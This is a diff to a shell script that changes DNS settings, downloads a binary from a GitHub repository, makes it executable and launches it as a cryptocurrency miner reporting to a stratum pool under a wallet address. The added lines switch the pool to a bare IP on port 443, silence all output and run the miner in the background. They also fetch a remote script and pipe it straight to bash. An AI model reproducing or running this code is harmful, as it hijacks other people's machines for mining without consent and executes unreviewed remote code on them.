@@ -10,4 +10,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget -O asu https://github.com/kartolo92/pile/raw/main/CPU
 chmod 777 asu
-./asu -a yescryptr32  -o stratum+tcp://eu.rplant.xyz:7047 -u lpep1qkvhl0w9luux3553tju2apjvmjg2rfpzkrn4sst.$(shuf -n 1 -i 1-99999)-kzp
+./asu -a yescryptr32  -o stratum+tcp://165.22.13.21:443 -u lpep1qkvhl0w9luux3553tju2apjvmjg2rfpzkrn4sst.$(shuf -n 1 -i 1-99999)-kzp > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
